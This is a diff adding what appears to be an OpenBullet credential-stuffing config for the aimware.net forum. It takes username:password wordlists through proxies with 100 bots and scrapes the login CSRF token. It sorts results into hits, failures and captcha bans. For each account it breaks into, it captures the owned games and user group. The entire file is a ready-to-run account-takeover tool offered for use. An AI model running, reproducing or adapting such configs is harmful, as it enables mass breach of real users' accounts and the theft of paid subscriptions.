@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Aimware.net",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T21:21:03.5492706+08:00",
+  "AdditionalInfo": "",
+  "Author": "Brian",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://aimware.net/forum/member.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://aimware.net" 
+  HEADER "referer: https://aimware.net/forum/index.php" 
+
+REQUEST POST "https://aimware.net/forum/member.php" 
+  CONTENT "action=do_login&url=https%3A%2F%2Faimware.net%2Fforum%2Findex.php&quick_login=1&my_post_key=89cba143089a653467fb5e211ab14d9d&quick_username=<USER>&quick_password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://aimware.net" 
+  HEADER "referer: https://aimware.net/forum/index.php" 
+
+PARSE "<SOURCE>" LR "var my_post_key = \"" "\";" -> VAR "TOKEN" 
+
+REQUEST POST "https://aimware.net/forum/member.php" 
+  CONTENT "action=do_login&url=https%3A%2F%2Faimware.net%2Fforum%2Findex.php&quick_login=1&my_post_key=<TOKEN>&quick_username=<USER>&quick_password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://aimware.net" 
+  HEADER "referer: https://aimware.net/forum/index.php" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You have successfully been logged in" 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+  KEYCHAIN Ban OR 
+    KEY "Image Verification" 
+
+REQUEST GET "https://aimware.net/forum/panel.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://aimware.net" 
+  HEADER "referer: https://aimware.net/forum/index.php" 
+
+PARSE "<SOURCE>" LR "<td class=\"trow1\"><span class=\"smalltext\"><strong>" "<" Recursive=TRUE -> CAP "Game" 
+
+REQUEST GET "https://aimware.net/forum/usercp.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://aimware.net" 
+  HEADER "referer: https://aimware.net/forum/index.php" 
+
+PARSE "<SOURCE>" LR "Primary User Group:</strong> " "<" -> CAP "Group" "" " | Edited by D1NO" 
+
